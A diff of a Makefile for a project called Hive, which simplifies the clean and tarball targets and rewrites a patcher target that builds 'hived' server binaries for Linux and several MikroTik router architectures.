@@ -1,9 +1,8 @@
-
+.SILENT:
 all:
 	@echo
 	@echo " Options:"
 	@echo "  .  make clean"
-	@echo "  .  make svnclean"
 	@echo "  .  make tarball"
 	@echo "  .  make patcher"
 	@echo
@@ -11,38 +10,27 @@ all:
 clean:
 	make -C server clean
 	make -C client clean
-	make -C honeycomb clean
-	make -C server/bzip/bzip2-1.0.6 clean
-	rm -rf hive.tar Logs
-
-svnclean: clean
-	make -C client patcher
-	make -C libs/polarssl-0.14.0/library clean
-	make -C libs/polarssl-0.14.0/programs clean
-#	only difference between 'make clean' and commands below
-#	is 'make -C client' calls 'svnclean' rather than 'clean'
-	make -C client svnclean
-	make -C honeycomb clean
-	make -C server/bzip/bzip2-1.0.6 clean
-	rm -rf hive.tar Logs
+	rm -rf *.tar Logs
 
 tarball:
-	@tar --exclude .svn --exclude HiveServer.sdf --exclude *.gz --exclude *.tar --exclude *.tgz -cvf hive.tar * >/dev/null
+	tar --exclude=.svn --exclude=HiveServer.sdf --exclude=*.gz --exclude=*.tar --exclude=*.tgz --exclude=documentation/html/* -cvf hive.tar * >/dev/null
 
 ilm-tar:
 	tar --exclude .svn --exclude HiveServer.sdf --exclude *.gz --exclude *.tar --exclude *.tgz -czvf hive-ilm-1.1.tgz client/ libs/ ilm-client/
 
 patcher:
-	cd server && make clean && make linux-x86
-	cd server && make clean && make mikrotik-x86
-	cd server && make clean && make mikrotik-ppc
-	cd server && make clean && make mikrotik-mipsbe
-	cd server && make clean && make mikrotik-mipsle
-	cp server/hived-linux-i686 client/hived-linux-i386-unpatched
-	cp server/hived-mikrotik-i386 client/hived-mikrotik-i386-unpatched
-	cp server/hived-mikrotik-ppc client/hived-mikrotik-ppc-unpatched
-	cp server/hived-mikrotik-mipsbe client/hived-mikrotik-mipsbe-unpatched
-	cp server/hived-mikrotik-mipsle client/hived-mikrotik-mipsle-unpatched
+	printf "\n\nRun the Hive patcher only on hive-builder\n\n"
+	sleep 2
+	cd server && make linux-x86
+	cd server && make mikrotik-x86
+	cd server && make mikrotik-ppc
+	cd server && make mikrotik-mips
+	cd server && make mikrotik-mipsel
+#	cp server/hived-linux-i686 client/hived-linux-i386-unpatched
+#	cp server/hived-mikrotik-i386 client/hived-mikrotik-i386-unpatched
+#	cp server/hived-mikrotik-ppc client/hived-mikrotik-ppc-unpatched
+#	cp server/hived-mikrotik-mipsbe client/hived-mikrotik-mipsbe-unpatched
+#	cp server/hived-mikrotik-mipsle client/hived-mikrotik-mipsle-unpatched
 	cd client && make clean && make patcher
 
 linux-x86:
